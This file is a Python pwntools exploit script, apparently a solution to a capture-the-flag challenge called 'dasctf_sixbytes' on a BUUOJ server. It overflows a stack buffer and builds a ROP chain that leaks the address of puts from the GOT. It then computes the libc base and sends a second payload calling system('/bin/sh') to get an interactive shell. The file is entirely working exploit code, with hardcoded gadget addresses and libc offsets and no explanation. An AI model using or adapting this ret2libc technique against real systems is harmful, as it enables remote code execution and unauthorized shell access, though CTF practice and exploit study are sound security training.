
from pwn import *

# context.log_level = "debug"
io = remote("node4.buuoj.cn", 28981)
# io = remote("192.168.170.128", 1234)
# context(arch = 'i386', os = 'linux')
# elf = ELF('dasctf_sixbytes')

padding = 0x20 + 8
pop_rdi = 0x00400753
pop_rsi_r15_ret = 0x0000000000400751

# elf = ELF('./dasctf_sixbytes')
# io = process("./dasctf_sixbytes")

puts_plt = 0x400520
puts_got = 0x601018
setvbuf_got = 0x0601028
fgets_got = 0x0601020
ret = 0x000000000040050e
main = 0x00400698

payload = b'a' * padding + p64(ret) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
io.recvuntil("time?")
io.sendline(payload)
print(io.recvline())
print(io.recvline())
puts_real = u64(io.recv(6).ljust(8, b'\x00'))
print(hex(puts_real))
libc_base = puts_real - 0x084420

sys_padding = 0x0052290
bin_sh_padding = 0x01B45BD
sys_addr = sys_padding + libc_base
bin_sh_addr = bin_sh_padding + libc_base

payload = b'a' * padding + p64(pop_rdi) + p64(bin_sh_addr) + p64(sys_addr)

io.recvuntil("time?")
io.sendline(payload)

io.interactive()